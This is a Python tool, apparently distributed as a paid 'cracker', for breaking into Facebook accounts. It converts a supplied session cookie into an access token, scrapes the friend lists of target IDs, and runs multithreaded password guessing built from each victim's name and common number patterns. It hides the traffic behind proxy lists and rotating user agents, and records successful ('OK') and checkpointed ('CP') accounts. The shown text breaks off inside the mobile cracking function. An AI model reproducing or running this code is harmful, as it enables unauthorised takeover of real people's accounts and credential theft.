# Modul
import datetime;now = datetime.date.today();target = datetime.date(2024, 7, 5)
if now >=target:exit("وقفت")
else:print("شغالة")
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
def banner():
	print(f"""\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
           _____  _______     __      _   _  
     /\   |  __ \|_   _\ \   / //\   | \ | | 
    /  \  | |__) | | |  \ \_/ //  \  |  \| | 
   / /\ \ |  _  /  | |   \   // /\ \ | . ` | 
  / ____ \| | \ \ _| |_   | |/ ____ \| |\  | 
 /_/    \_\_|  \_\_____|  |_/_/    \_\_| \_| 
"""  )
os.system('clear')
token=input('   \x1b[1;97mَ  ➪ ToKeN \033[2;36m: \033[2;35m')
print('')
print('')
ID=input(f'  \x1b[1;97m  ➪ ID    \033[2;36m: \033[2;35m')
KONANVIP= '\n - 🫶 مرحب بك في اداة المطور \n 𓆩@aaswxj𓆪 \n𖣘─────━𓆩𝑲𝑯𝑨𝑳𝑬𝑫𓆪━─────𖣘\nلا تـنسى ان تـرسل صـور الـصيد ➩\n<><><><><><><><><><><><><\n\n𖣘──━𓆩تم تشغيل لادات 𓆪━──𖣘\n\n𖣘─────━𓆩 مدفوعه 𓆪━─────𖣘 '
requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(KONANVIP))
os.system('clear')
𝑲𝑯𝑨𝑳𝑬𝑫 = f'''tg://openmessage?user_id={ID}'''
pretty.install()
CON=sol()
	







uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')



#useragent
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 10; SM-A750FN)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

def MR4X1(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		MRBX = '2008-2009'
	elif len(fx)==8:
		MRBX = '2007-2008'
	elif len(fx)==7:
		MRBX = '2006-2007'
	else:MRBX=''
	return MRBX

import os, platform, time, sys

# COLOUR 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m'
p = '\x1b[0;34m' 
asu = random.choice([m,k,h,u,b])
# CONVERTER
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def masud(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.001)
def clear():
	os.system('clear')
def back():
	login()
# LOGO
def banner():
	clear()
	print(f'  ࿋  ☠    ️★★★★★★★★★★   ☠  ࿋ ️')
	print(f"""\x1b[38;5;196m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
           _____  _______     __      _   _  
     /\   |  __ \|_   _\ \   / //\   | \ | | 
    /  \  | |__) | | |  \ \_/ //  \  |  \| | 
   / /\ \ |  _  /  | |   \   // /\ \ | . ` | 
  / ____ \| | \ \ _| |_   | |/ ____ \| |\  | 
 /_/    \_\_|  \_\_____|  |_/_/    \_\_| \_| 
"""  )
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			ma = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			ma2 = json.loads(ma.text)['name']
			ma3 = json.loads(ma.text)['id']
			menu(ma2,ma3)
		except KeyError:
			login_c()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='purple')
			exit()
	except IOError:
		login_c()
def login_c():
	try:
		os.system('clear')
		banner()
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		banner()
		your_cookies = input(' Cookie :  ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n ╰─  Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n ╰─  Login Berhasil | python Reba.py");exit()
							os.system('python Reba.py')
			except Exception as e:
				print(" ╰─  Cookies Mokad Kontol")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
# MAIN MENU
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('%s[%s✘%s]%s Cookies Expired '%(N,H,N,M))
		time.sleep(5)
		login_c()
	os.system('clear')
	banner()
	#print('        \n    [\033[1;97m\033[1;41m  LOGIN INFO   \033[0m\033[1;93m]\n')
	#print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m Your ID : "+str(my_id)) 
	#rint("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m Name    : "+str(my_name))
	#print('        \n    [\033[1;97m\033[1;41m  Telegram   \033[0m\033[1;93m]\n')
	#print('        \n    [\033[1;97m\033[1;41m  Reba777   \033[0m\033[1;93m]\n')
	#print('\n    [\033[1;97m\033[1;41m  OPTION MENU   \033[0m\033[1;93m]\n')
	print('%s[%s1%s]%s PUBLIC CRACKER %s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s[%s2%s]%s FILE CRACKER %s[%sON%s]'%(P,H,P,H,P,H,P))	
	#print('%s[%s3%s]%s CREATE | FILE  %s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s[%sB%s]%s EXIT %s[%sOut%s]'%(P,H,P,H,P,H,P))
	MRBX = input('%s[%s?%s]%s select menu %s : '%(N,H,N,H,M))
	if MRBX in ['1','01']:
		public()
	elif MRBX in ['2','02']:
		File2()
	#elif MRBX in ['3','03']:
	#	File3()
	elif MRBX in ['A','a']:
		os.system('xdg-open https://m.me/Kamrul.Vau.143');menu(my_name,my_id)
	elif MRBX in ['B','b']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('[] Connection Is Over ')
		exit()
# PUBLIC CRACK
def public():    
 try:
  token = open('.token.txt','r').read()
  cok = open('.cok.txt','r').read()
 except IOError:
     exit()
 try:
     jum = int(input('[?] chan ID awe  : '))
 except ValueError:
     print('{k}[✘] NOT PUBLIC ID ')
     exit()
 if jum<1 or jum>100:
     print('[✘] Your limit error')
     exit()
 ses=requests.Session()
 yz = 0
 for met in range(jum):
  yz+=1
  kl = input('[➤] Id dana '+str(yz)+' : ')
  uid.append(kl)
 for user in uid:
     try:
        head = (
        {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
        })
        if len(id) == 0:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }           
        )
        else:
            params = (
            {
            'access_token':
            'fields' "friends"
            }            
        )
        b = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
        for mi in b['friends']['data']:
            try:
                iso = (mi['id']+'|'+mi['name'])
                if iso in id:pass
                else:id.append(iso)
            except:continue
     except (KeyError,IOError):
       pass
     except requests.exceptions.ConnectionError:
       print('{k}[✘] Error  ')
       exit()
 try:
       print('')
       print(f'[•] hamw Id :{b}'+str(len(id))) 
       setting()
 except requests.exceptions.ConnectionError:
     print(f'{u}')
     print('[✘] No Internet connection ')
     exit()
 except (KeyError,IOError):
  print(f'[✘] Not Public  {u}')
  time.sleep(3)
  exit()
#-------------[ FILE - CRACK ]-------------#
def File2():
			print('')
			print('\x1b[1;92m             FILE CLONING')
			try:
				print('        - - - - - - - - - - - -')
				fileX = input (f' {P}[+] ENTER FILE PATH :\x1b[1;92m ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				print('')
				print('\x1b[1;92mTOTAL ID :\x1b[1;91m '+str(len(id)))
				setting()
			except IOError:
				exit("\x1b[1;91m[!] FILE  %s NOT FOUND"%(fileX))
#-------------[ FILE - CREATE ]-------------#
def File3():
    os.system('git clone https://github.com/ARIYAN-AHMED-143/FILE')
    os.system('cd FILE')
    os.system('python FILE.py')
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	os.system('clear')
#	banner()
	if ['1','01']:
		os.system('1')
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		exit()
#	banner()
	method.append('mobile')
	if ['01','1']:
		os.system('1')
		su()
	
def su():
	bo = random.choice([m,k,h,b,u,p])
	print(f'''
\033[32m[1] PASSWORD KURDI [ FAST ]
\033[32m[2] PASSWORD Arab  [ FAST ]
''')
	print("\033[1;32m➣ \033[1;37m TOTAL ID : "+str(len(id)))
	ch = input('! \033[1;97m[\033[1;92m-\033[1;97m] KAMAY >> \033[1;97m  ')
	if ch in ['1','01']:
		passwrd1()
	elif ch in ['2','02']:
		password2()
	else:
		passwrd1()
		password2()
	
# password # 
    
# password 2#
	    
def passwrd1():
	os.system('clear')
	#banner()
	print("")
	#print(f'\033[1;32m➣ \033[1;37m DATE : '+str(dddd)+'-'+str(mmmm)+'-'+str(yyyy)+'')
	print('\033[0;91m✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮')
	print(f"\033[1;92m[\033[1;92m\033[1;32m+\033[1;92m] TOTAL ID       \033[1;34m: \033[0;92m"+str(len(id)))
	print('\033[0;91m✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮')
	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'>> Mainkan Mode Pesawat Setiap {m}1k{x} Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:			
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'12')
					pwv.append(frs+'1122')
					pwv.append(frs+'321')
					pwv.append(frs+'54321')
					pwv.append('123'+frs+'123')
					pwv.append('1234'+frs+'1234')
					pwv.append('12345'+frs+'12345')
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append('112233'+frs)
					pwv.append('112233445566')					
					pwv.append(frs+'112233')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'12')
					pwv.append(frs+'1122')
					pwv.append(frs+'321')
					pwv.append(frs+'54321')
					pwv.append('123'+frs+'123')
					pwv.append('1234'+frs+'1234')
					pwv.append('12345'+frs+'12345')
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append('112212'+frs)
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')					
					pwv.append(frs+'1234567890')
					pwv.append(frs+'12')
					pwv.append(frs+'1122')
					pwv.append(frs+'21')
					pwv.append(frs+'321')
					pwv.append(frs+'4321')
					pwv.append(frs+'54321')
					pwv.append(frs+'654321')
					pwv.append(frs+'7654321')
					pwv.append(frs+'87654321')
					pwv.append(frs+'987654321')										
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crackmobile_MRBX,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crackmbasic_MRBX,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv)
	print('')
	print(' \033[1;34m OK = %s '%(ok))
	print('')
	print(' \033[1;37m CP = %s '%(cp))
	print('\033[1;34mBO DUBARA CRACK KRDN [CTRL + P] DAGRA')
	exit()
	
def password2():
	os.system('clear')
	banner()
	print('\033[0;91m✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮')
	print(f"\033[1;92m[\033[1;92m\033[1;32m+\033[1;92m] TOTAL ID       \033[1;34m: \033[0;92m"+str(len(id)))
	print(f'OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'CP{x} Save in : {k}CP/%s {x}'%(cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
					pwv.append(nmf)
					pwv.append(frs + frs)
					pwv.append(frs+' '+frs)
					pwv.append(frs+'123')
					pwv.append('12345qwert')
					pwv.append('aaaassss')
					pwv.append('zzzzxxxx')
					pwv.append('zzxxccvv')
					pwv.append('zxcvzxcv')
					pwv.append('ppooiiuu')
					pwv.append('qqwweerrtt')
					pwv.append('aassddff')
					pwv.append('oooopppp')
					pwv.append('qqwweerr')
					pwv.append('mmnnbbvv')
					pwv.append('ppooiiuuyy')           
					pwv.append('20202020')
					pwv.append('20002000')
					pwv.append('20232023')    
					pwv.append('20222022')              
					pwv.append('11110000')
					pwv.append('11112222')
					pwv.append('10002000')
					pwv.append('00009999')            
					pwv.append('07800780')            
					pwv.append('07700770')
					pwv.append('0099887766')
					pwv.append('00998877')          
					pwv.append('00998866')       
					pwv.append('112233445566')
					pwv.append('1122334455')     
					pwv.append('1234512345')
					pwv.append('123456123456')
					pwv.append('123456654321')  
					pwv.append('1122334455@@')
					pwv.append('1234512345@@')  
					pwv.append('12345@12345')      
					pwv.append('1@2@3@4@5@')
					pwv.append('123@123')             
					pwv.append('Aa11223344')
					pwv.append('١٢٣٤٥٦٧٨٩')
					pwv.append('١٢٣٤٥٦')      
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs + frs)
					pwv.append(frs+' '+frs)
					pwv.append(frs+'123')
					pwv.append('12345qwert')
					pwv.append('aaaassss')
					pwv.append('zzzzxxxx')
					pwv.append('zzxxccvv')
					pwv.append('zxcvzxcv')
					pwv.append('ppooiiuu')
					pwv.append('qqwweerrtt')
					pwv.append('aassddff')
					pwv.append('oooopppp')
					pwv.append('qqwweerr')
					pwv.append('mmnnbbvv')
					pwv.append('ppooiiuuyy')           
					pwv.append('20202020')
					pwv.append('20002000')
					pwv.append('20232023')    
					pwv.append('20222022')              
					pwv.append('11110000')
					pwv.append('11112222')
					pwv.append('10002000')
					pwv.append('00009999')            
					pwv.append('07800780')            
					pwv.append('07700770')
					pwv.append('0099887766')
					pwv.append('00998877')          
					pwv.append('00998866')       
					pwv.append('112233445566')
					pwv.append('1122334455')     
					pwv.append('1234512345')
					pwv.append('123456123456')
					pwv.append('123456654321')  
					pwv.append('1122334455@@')
					pwv.append('1234512345@@')  
					pwv.append('12345@12345')      
					pwv.append('1@2@3@4@5@')
					pwv.append('123@123')             
					pwv.append('Aa11223344')
					pwv.append('١٢٣٤٥٦٧٨٩')
					pwv.append('١٢٣٤٥٦')      
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crackmobile_MRBX,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crackmbasic_MRBX,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv)
	print('')
#	print(' \033[1;34m OK = %s '%(ok))
	print('')
#	print(' \033[1;37m CP = %s '%(cp))
	print('\033[1;34mBO DUBARA CRACK KRDN [CTRL + P] DAGRA')
	exit()

# Mobile 
xxh = '\x1b[38;5;208m'#برتقالي
r1='\x1b[38;5;8m'#رمادي
m1='\x1b[38;5;196m'#احمر
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فاتح
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a303 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[0;34m'  # أزرق سماوي	
def crackmobile_MRBX(idf,pwv,nmf):
    global loop,ok,cp
    bo = random.choice([a3,a4,a5,a6,a7,a10,a12,a14,u,k,kk,b,h,hh,a19,a20,a21,a22,a23,a25,a26,a27,a36,a37,a40,xxh,])
